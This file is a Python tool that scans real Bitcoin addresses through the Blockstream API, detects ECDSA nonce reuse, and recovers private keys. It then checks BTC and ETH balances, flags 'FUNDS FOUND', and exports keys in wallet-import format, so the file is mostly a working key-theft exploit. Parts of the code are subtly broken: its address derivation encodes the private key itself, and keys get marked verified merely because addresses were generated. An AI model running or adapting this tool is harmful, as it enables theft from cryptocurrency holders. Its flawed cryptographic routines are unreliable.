#!/usr/bin/env python3
"""
Automated Bitcoin Private Key Recovery System
Based on ECDSA nonce reuse vulnerability analysis

This module implements the mathematical formula:
Key = ((r × (s1 - s2))^(p-2) mod p) × ((m1 × s2) - (m2 × s1)) mod p

Where:
- p = SECP256K1 curve order: 115792089237316195423570985008687907852837564279074904382605163141518161494337
- r, s = ECDSA signature components
- m = message hash (what OP_CHECKSIG verifies)
"""

import requests
import hashlib
import time
import base58
from typing import Dict, List, Tuple, Optional, Any
from ecdsa import SECP256k1
from ecdsa.numbertheory import inverse_mod
from crypto_utils import (
    parse_signature, extract_r_s, compute_z, validate_bitcoin_address,
    private_key_to_wif, private_key_to_bitcoin_address
)

# SECP256K1 constants
SECP256K1_N = SECP256k1.order
SECP256K1_P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

class AutoKeyRecovery:
    def __init__(self):
        self.base_url = "https://blockstream.info/api"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Bitcoin-Auto-Key-Recovery/1.0'
        })
        self.recovered_keys = []
        self.vulnerable_addresses = []
        self.bitcoin_utils = CryptoUtils()  # Initialize Bitcoin utilities

    def fetch_transactions(self, address: str) -> List[Dict]:
        """Fetch all transactions for a Bitcoin address"""
        all_txs = []
        last_seen_txid = None

        while True:
            url = f"{self.base_url}/address/{address}/txs"
            if last_seen_txid:
                url += f"/chain/{last_seen_txid}"

            try:
                response = self.session.get(url, timeout=30)
                response.raise_for_status()
                txs = response.json()

                if not txs:
                    break

                all_txs.extend(txs)
                last_seen_txid = txs[-1]['txid']

                # Rate limiting
                time.sleep(0.1)

            except requests.RequestException as e:
                print(f"Error fetching transactions for {address}: {e}")
                break

        return all_txs

    def fetch_tx_hex(self, txid: str) -> str:
        """Fetch raw transaction hex with retry logic"""
        url = f"{self.base_url}/tx/{txid}/hex"
        retry_count = 0
        max_retries = 3

        while retry_count <= max_retries:
            try:
                response = self.session.get(url, timeout=30)

                if response.status_code == 429:  # Rate limited
                    retry_count += 1
                    if retry_count <= max_retries:
                        wait_time = min(2 ** retry_count, 30)
                        print(f"Rate limited fetching {txid[:8]}..., waiting {wait_time}s")
                        time.sleep(wait_time)
                        continue
                    else:
                        raise requests.HTTPError(f"Rate limited: {txid}")

                response.raise_for_status()
                return response.text.strip()

            except requests.RequestException as e:
                retry_count += 1
                if retry_count <= max_retries:
                    print(f"Error fetching {txid[:8]}..., retry {retry_count}/{max_retries}: {e}")
                    time.sleep(2)
                    continue
                else:
                    raise e

    def extract_signature_data(self, address: str) -> List[Tuple[int, int, int, str]]:
        """Extract all signature data (r, s, m, txid) for an address"""
        txs = self.fetch_transactions(address)
        signatures = []

        print(f"Processing {len(txs)} transactions for {address}")

        for tx in txs:
            txid = tx["txid"]

            try:
                # Fetch raw transaction
                raw = self.fetch_tx_hex(txid)
                m = compute_z(raw)  # Message hash

                # Process each input signature
                for vin in tx.get("vin", []):
                    sig = parse_signature(vin)
                    if not sig:
                        continue

                    try:
                        r, s = extract_r_s(sig)
                        signatures.append((r, s, m, txid))

                    except Exception as e:
                        print(f"Failed to extract r,s from {txid}: {e}")

            except Exception as e:
                print(f"Failed to process transaction {txid}: {e}")

        return signatures

    def recover_private_key_strm_method(self, r: int, s1: int, m1: int, s2: int, m2: int) -> int:
        """
        Recover private key using the STRM method formula:
        Key = ((r × (s1 - s2))^(p-2) mod p) × ((m1 × s2) - (m2 × s1)) mod p
        """
        try:
            # Calculate (s1 - s2)
            s_diff = (s1 - s2) % SECP256K1_N
            if s_diff == 0:
                raise ValueError("s1 and s2 are identical")

            # Calculate r × (s1 - s2)
            r_s_diff = (r * s_diff) % SECP256K1_N

            # Calculate (r × (s1 - s2))^(p-2) mod p using Fermat's little theorem
            # This is equivalent to modular inverse
            inverse_part = pow(r_s_diff, SECP256K1_N - 2, SECP256K1_N)

            # Calculate (m1 × s2) - (m2 × s1)
            m_diff = ((m1 * s2) - (m2 * s1)) % SECP256K1_N

            # Final calculation: Key = inverse_part × m_diff mod p
            private_key = (inverse_part * m_diff) % SECP256K1_N

            # Validate the key is in valid range
            if private_key <= 0 or private_key >= SECP256K1_N:
                raise ValueError("Invalid private key range")

            return private_key

        except Exception as e:
            raise ValueError(f"STRM method recovery failed: {e}")

    def verify_private_key(self, private_key: int, address: str) -> bool:
        """Verify if the recovered private key corresponds to the given address"""
        try:
            # Generate address from private key (try both compressed and uncompressed)
            for compressed in [True, False]:
                generated_address = private_key_to_bitcoin_address(private_key, compressed=compressed)
                if generated_address == address:
                    return True
            return False
        except Exception:
            return False

    def analyze_address_for_vulnerabilities(self, address: str) -> Dict:
        """
        Analyze a Bitcoin address for nonce reuse vulnerabilities
        Returns recovered private keys and vulnerability details
        """
        if not validate_bitcoin_address(address):
            raise ValueError("Invalid Bitcoin address format")

        print(f"\n=== Analyzing address: {address} ===")

        # Extract all signature data
        signatures = self.extract_signature_data(address)

        if len(signatures) < 2:
            return {
                'address': address,
                'vulnerable': False,
                'reason': 'Insufficient signatures for analysis',
                'signatures_found': len(signatures)
            }

        print(f"Found {len(signatures)} signatures to analyze")

        recovered_keys = []
        vulnerabilities = []

        # Compare all signature pairs for nonce reuse
        for i in range(len(signatures)):
            for j in range(i + 1, len(signatures)):
                r1, s1, m1, txid1 = signatures[i]
                r2, s2, m2, txid2 = signatures[j]

                # Check for nonce reuse (same r value)
                if r1 == r2 and s1 != s2:
                    try:
                        # Recover private key using STRM method
                        private_key = self.recover_private_key_strm_method(r1, s1, m1, s2, m2)

                        # Generate comprehensive key information
                        key_data = self.generate_comprehensive_key_info(private_key, txid1, txid2)

                        # Verify the recovered key
                        is_valid = self.verify_private_key(private_key, address)
                        key_data['verified'] = is_valid

                        vulnerability = {
                            'type': 'ECDSA_nonce_reuse',
                            'description': 'Same nonce used in multiple signatures',
                            'severity': 'critical',
                            'transactions': [txid1, txid2],
                            'signature_details': {
                                'r': hex(r1),
                                's1': hex(s1),
                                's2': hex(s2),
                                'm1': hex(m1),
                                'm2': hex(m2)
                            }
                        }

                        vulnerabilities.append(vulnerability)
                        recovered_keys.append(key_data)

                        print(f"🔓 VULNERABILITY FOUND!")
                        print(f"   Private Key (WIF): {key_data.get('private_key_wif', 'N/A')}")
                        print(f"   Verified: {'✓' if is_valid else '✗'}")
                        print(f"   Transactions: {txid1[:16]}... & {txid2[:16]}...")
                        print(f"   BTC Balance: {key_data['summary']['total_btc_balance']} BTC")
                        print(f"   ETH Balance: {key_data['summary']['ethereum_balance_eth']} ETH")

                    except Exception as e:
                        print(f"Failed to recover key from {txid1[:8]}.../{txid2[:8]}...: {e}")

        result = {
            'address': address,
            'vulnerable': len(recovered_keys) > 0,
            'signatures_analyzed': len(signatures),
            'vulnerabilities_found': len(vulnerabilities),
            'recovered_keys': recovered_keys,
            'vulnerabilities': vulnerabilities
        }

        if recovered_keys:
            self.recovered_keys.extend(recovered_keys)
            self.vulnerable_addresses.append(address)

        return result

    def batch_analyze_addresses(self, addresses: List[str]) -> Dict:
        """Analyze multiple Bitcoin addresses for vulnerabilities"""
        results = {
            'total_addresses': len(addresses),
            'vulnerable_addresses': 0,
            'total_keys_recovered': 0,
            'results': [],
            'summary': {
                'vulnerable_addresses': [],
                'all_recovered_keys': []
            }
        }

        print(f"Starting batch analysis of {len(addresses)} addresses...")

        for i, address in enumerate(addresses, 1):
            print(f"\n[{i}/{len(addresses)}] Analyzing: {address}")

            try:
                result = self.analyze_address_for_vulnerabilities(address)
                results['results'].append(result)

                if result['vulnerable']:
                    results['vulnerable_addresses'] += 1
                    results['total_keys_recovered'] += len(result['recovered_keys'])
                    results['summary']['vulnerable_addresses'].append(address)
                    results['summary']['all_recovered_keys'].extend(result['recovered_keys'])

            except Exception as e:
                print(f"Error analyzing {address}: {e}")
                results['results'].append({
                    'address': address,
                    'error': str(e),
                    'vulnerable': False
                })

        return results

    def export_recovered_keys(self, filename: str = "recovered_keys.txt"):
        """Export all recovered private keys to a file"""
        with open(filename, 'w') as f:
            f.write("# Bitcoin Private Keys Recovered via ECDSA Nonce Reuse Attack\n")
            f.write("# Format: WIF_Private_Key | Address | Verification_Status | BTC_Balance | ETH_Balance\n\n")

            for key_data in self.recovered_keys:
                verification = "VERIFIED" if key_data['verified'] else "UNVERIFIED"
                btc_balance = key_data['summary']['total_btc_balance']
                eth_balance = key_data['summary']['ethereum_balance_eth']
                f.write(f"WIF: {key_data.get('private_key_wif', 'N/A')}\n")
                f.write(f"  Hex: {key_data['private_key_hex']}\n")
                f.write(f"  Verification: {verification}\n")
                f.write(f"  BTC Balance: {btc_balance} BTC\n")
                f.write(f"  ETH Balance: {eth_balance} ETH\n")

                # Output Bitcoin addresses and balances
                f.write("\n  Bitcoin Addresses:\n")
                for addr_type, address in key_data['bitcoin_addresses'].items():
                    f.write(f"    {addr_type}: {address}\n")
                    balance_info = key_data['bitcoin_balances'].get(addr_type)
                    if balance_info:
                        f.write(f"      Balance: {balance_info.get('balance_btc', 0)} BTC\n")
                    else:
                        f.write("      Balance: N/A\n")

                # Output Ethereum address and balance
                f.write(f"\n  Ethereum Address: {key_data.get('ethereum_address', 'N/A')}\n")
                if key_data.get('ethereum_balance'):
                    eth_balance_info = key_data['ethereum_balance']
                    f.write(f"    Balance: {eth_balance_info.get('balance_eth', 0)} ETH\n")
                else:
                    f.write("    Balance: N/A\n")

                f.write(f"  Transactions: {key_data['tx1']}, {key_data['tx2']}\n")
                f.write(f"  Method: {key_data['method']}\n\n")

        print(f"Exported {len(self.recovered_keys)} recovered keys to {filename}")

    def generate_comprehensive_key_info(self, private_key: int, tx1: str = "", tx2: str = "") -> Dict:
        """Generate comprehensive key information including all address types and balances"""
        try:
            key_info = {
                'private_key_hex': hex(private_key),
                'private_key_wif': None,
                'bitcoin_addresses': {},
                'bitcoin_balances': {},
                'ethereum_address': None,
                'ethereum_balance': None,
                'tx1': tx1,
                'tx2': tx2,
                'method': 'strm_nonce_reuse',
                'verified': False,
                'summary': {}
            }

            # Generate Bitcoin addresses for all types
            address_types = [
                ('compressed_mainnet', True, False),
                ('uncompressed_mainnet', False, False),
                ('compressed_testnet', True, True),
                ('uncompressed_testnet', False, True)
            ]

            total_btc_balance = 0
            active_addresses = 0

            for addr_type, compressed, testnet in address_types:
                try:
                    # Generate address
                    address = self.bitcoin_utils.private_key_to_address(private_key, compressed, testnet)
                    key_info['bitcoin_addresses'][addr_type] = address

                    # Get WIF for each type
                    wif_key = self.bitcoin_utils.private_key_to_wif(private_key, compressed, testnet)
                    if addr_type == 'compressed_mainnet':
                        key_info['private_key_wif'] = wif_key

                    # Check balance for all addresses (mainnet and testnet)
                    try:
                        balance_info = self.bitcoin_utils.get_address_balance(address)
                        key_info['bitcoin_balances'][addr_type] = balance_info

                        # Only count mainnet balances in totals
                        if not testnet and balance_info.get('balance_btc', 0) > 0:
                            total_btc_balance += balance_info['balance_btc']
                            active_addresses += 1
                            print(f"🚨 FUNDS FOUND! {addr_type}: {address} has {balance_info['balance_btc']} BTC")

                    except Exception as e:
                        print(f"Balance check failed for {addr_type} {address}: {e}")
                        key_info['bitcoin_balances'][addr_type] = {
                            'error': str(e),
                            'balance_btc': 0,
                            'balance_satoshis': 0,
                            'tx_count': 0
                        }

                except Exception as e:
                    print(f"Address generation failed for {addr_type}: {e}")
                    key_info['bitcoin_addresses'][addr_type] = f"Error: {e}"

            # Generate Ethereum address
            try:
                eth_address = self.bitcoin_utils.private_key_to_ethereum_address(private_key)
                key_info['ethereum_address'] = eth_address

                # Get Ethereum balance
                eth_balance = self.bitcoin_utils.get_ethereum_balance(eth_address)
                key_info['ethereum_balance'] = eth_balance

                if isinstance(eth_balance, dict) and eth_balance.get('balance_eth', 0) > 0:
                    print(f"🚨 ETH FUNDS FOUND! {eth_address} has {eth_balance['balance_eth']} ETH")

            except Exception as e:
                print(f"Ethereum address generation failed: {e}")
                key_info['ethereum_address'] = f"Error: {e}"
                key_info['ethereum_balance'] = {'error': str(e), 'balance_eth': 0}

            # Create summary
            eth_balance_amount = 0
            if isinstance(key_info['ethereum_balance'], dict) and not key_info['ethereum_balance'].get('error'):
                eth_balance_amount = key_info['ethereum_balance'].get('balance_eth', 0)

            key_info['summary'] = {
                'total_btc_balance': total_btc_balance,
                'active_btc_addresses': active_addresses,
                'ethereum_balance_eth': eth_balance_amount,
                'has_funds': total_btc_balance > 0 or eth_balance_amount > 0
            }

            # Mark as verified if we successfully generated addresses
            key_info['verified'] = len([addr for addr in key_info['bitcoin_addresses'].values() if not str(addr).startswith('Error:')]) > 0

            return key_info

        except Exception as e:
            print(f"Key info generation failed: {e}")
            return {
                'error': f"Failed to generate key info: {e}",
                'private_key_hex': hex(private_key),
                'tx1': tx1,
                'tx2': tx2,
                'bitcoin_addresses': {},
                'bitcoin_balances': {},
                'summary': {'total_btc_balance': 0, 'active_btc_addresses': 0, 'ethereum_balance_eth': 0}
            }

class CryptoUtils:
    def __init__(self):
        self.base_url = "https://blockstream.info/api"
        self.eth_base_url = "https://api.etherscan.io/api"  # Example: Etherscan API
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Bitcoin-Auto-Key-Recovery/1.0'
        })
        self.etherscan_api_key = ""  # Replace with your Etherscan API key

    def private_key_to_address(self, private_key: int, compressed: bool, testnet: bool) -> str:
        """Generate Bitcoin address from private key (compressed or uncompressed)"""
        version_byte = 0x6f if testnet else 0x00
        private_key_hex = hex(private_key)[2:].zfill(64)
        extended_key = (version_byte).to_bytes(1, 'big') + bytes.fromhex(private_key_hex)
        
        # Add checksum
        sha256_hash1 = hashlib.sha256(extended_key).digest()
        sha256_hash2 = hashlib.sha256(sha256_hash1).digest()
        checksum = sha256_hash2[:4]
        extended_key_with_checksum = extended_key + checksum

        # Encode with Base58
        address = base58.b58encode(extended_key_with_checksum).decode('utf-8')
        return address

    def private_key_to_wif(self, private_key: int, compressed: bool, testnet: bool = False) -> str:
        """
        Convert private key to Wallet Import Format (WIF).
        """
        private_key_hex = hex(private_key)[2:].zfill(64)
        private_key_bytes = bytes.fromhex(private_key_hex)
        
        # Add prefix based on mainnet/testnet
        prefix = b'\xef' if testnet else b'\x80'

        # Add compression suffix if compressed
        if compressed:
            extended_key = prefix + private_key_bytes + b'\x01'
        else:
            extended_key = prefix + private_key_bytes

        # Calculate checksum
        sha256_hash1 = hashlib.sha256(extended_key).digest()
        sha256_hash2 = hashlib.sha256(sha256_hash1).digest()
        checksum = sha256_hash2[:4]

        # Append checksum
        wif_bytes = extended_key + checksum

        # Encode to Base58
        wif = base58.b58encode(wif_bytes).decode('utf-8')
        return wif

    def private_key_to_ethereum_address(self, private_key: int) -> str:
        """
        Generate Ethereum address from a private key.
        """
        try:
            from eth_keys import keys
            from eth_utils import keccak

            private_key_bytes = private_key.to_bytes(32, byteorder='big')
            public_key = keys.PrivateKey(private_key_bytes).public_key
            address_bytes = keccak(public_key.to_bytes())[-20:]
            return "0x" + address_bytes.hex()
        except ImportError:
            return "Error: eth_keys and eth_utils are required. Install with: pip install eth_keys eth_utils"

    def get_address_balance(self, address: str) -> Dict:
        """Get Bitcoin address balance from Blockstream API"""
        try:
            url = f"{self.base_url}/address/{address}"
            response = self.session.get(url, timeout=30)
            response.raise_for_status()
            data = response.json()
            balance_satoshis = data.get('chain_stats', {}).get('funded_txo_sum', 0) - data.get('chain_stats', {}).get('spent_txo_sum', 0)
            balance_btc = balance_satoshis / 100000000
            tx_count = data.get('chain_stats', {}).get('tx_count', 0)

            return {
                'balance_btc': balance_btc,
                'balance_satoshis': balance_satoshis,
                'tx_count': tx_count
            }

        except Exception as e:
            return {'error': str(e)}

    def get_ethereum_balance(self, address: str) -> Dict:
        """Get Ethereum address balance from Etherscan API"""
        try:
            if not self.etherscan_api_key:
                return {'error': 'Etherscan API key is required'}

            url = f"{self.eth_base_url}?module=account&action=balance&address={address}&tag=latest&apikey={self.etherscan_api_key}"
            response = self.session.get(url, timeout=30)
            response.raise_for_status()
            data = response.json()

            if data.get('status') == "1":
                balance_wei = int(data['result'])
                balance_eth = balance_wei / 10**18
                return {'balance_eth': balance_eth}
            else:
                return {'error': data.get('message', 'Unknown error')}

        except Exception as e:
            return {'error': str(e)}

# Example usage and testing
if __name__ == "__main__":
    recovery = AutoKeyRecovery()

    # Test with known vulnerable addresses from the STRM study
    test_addresses = [
        "1FaapwdwYVVBiV6Qvkis88c2KHPoxX1Jb1",  # Example from STRM study
        "1HGXq5Spi6NNXFKuQFfDDcYZmzTczKJi4b",  # Another test case
    ]

    # Analyze addresses
    results = recovery.batch_analyze_addresses(test_addresses)

    # Print summary
    print(f"\n=== ANALYSIS COMPLETE ===")
    print(f"Addresses analyzed: {results['total_addresses']}")
    print(f"Vulnerable addresses: {results['vulnerable_addresses']}")
    print(f"Total private keys recovered: {results['total_keys_recovered']}")

    # Export results
    if recovery.recovered_keys:
        recovery.export_recovered_keys()